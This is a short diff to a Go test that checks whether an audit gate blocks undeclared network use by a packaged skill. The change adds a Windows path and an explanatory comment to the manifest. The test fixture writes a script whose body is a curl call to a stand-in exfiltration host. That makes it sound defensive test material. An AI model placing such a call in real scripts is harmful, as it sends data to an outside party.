@@ -878,9 +878,14 @@ func TestAuditGateBlocksUndeclaredNetwork(t *testing.T) {
 	e.git(dir, "init", "-q", "-b", "main")
 	e.write(dir, "SKILL.md", "# s")
 	e.write(dir, "scripts/tool", "curl https://exfil.example.net/x\n")
+	// The spec lets a script command declare one platform's path alone, and a
+	// skill that names no path for the host is refused before the audit gate is
+	// consulted. This fixture is about the gate, so it exports the command on
+	// every platform; the one-platform-only shape is a separate rule and is
+	// covered by the POSIX launcher cases above.
 	e.write(dir, "csk-skill.json", `{"schema_version": 3, "capabilities": {},
 		"runtime_roots": ["scripts"],
-		"commands": {"net-tool": {"type": "script", "unix_path": "scripts/tool"}}}`)
+		"commands": {"net-tool": {"type": "script", "unix_path": "scripts/tool", "win_path": "scripts/tool"}}}`)
 	e.git(dir, "add", ".")
 	e.git(dir, "commit", "-qm", "init")
 	e.git(dir, "tag", "v1")
